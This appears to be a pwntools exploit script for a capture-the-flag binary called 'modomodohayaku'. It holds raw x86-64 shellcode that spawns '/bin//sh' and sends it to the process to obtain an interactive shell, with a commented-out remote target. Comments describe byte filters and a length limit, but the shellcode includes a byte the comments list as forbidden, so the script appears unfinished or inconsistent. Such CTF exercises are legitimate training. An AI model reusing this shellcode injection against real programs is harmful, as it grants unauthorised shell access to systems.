from pwn import *



context.arch = "amd64"
elf=ELF('./pwn/modomodohayaku/modomodohayaku')
r = process('./pwn/modomodohayaku/modomodohayaku')
#r = remote('ctf.adl.tw', 10002)


#buffer has 240 bytes (30 vars*8)
#first 96 bytes cannot have 0x90, 0x6b, 0x69, 0x72, 0x74, 0x6f
#read 96 bytes into buffer
#divide the shellcode into lines of 6
#first 16 lines must start with 0xc 0x87 0x63
#after the 112 byte(16 bytes from the 16th line), the shellcode will be executed.
#This means we have to limit the shellcode within 112 bytes



payload=b"\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"



print(disasm(payload))#in intel syntax, e.g. dest=src
#exit(0)
output=r.recvuntil(b'..........')
print(output)
pause()
r.send(flat(payload))

r.interactive()

 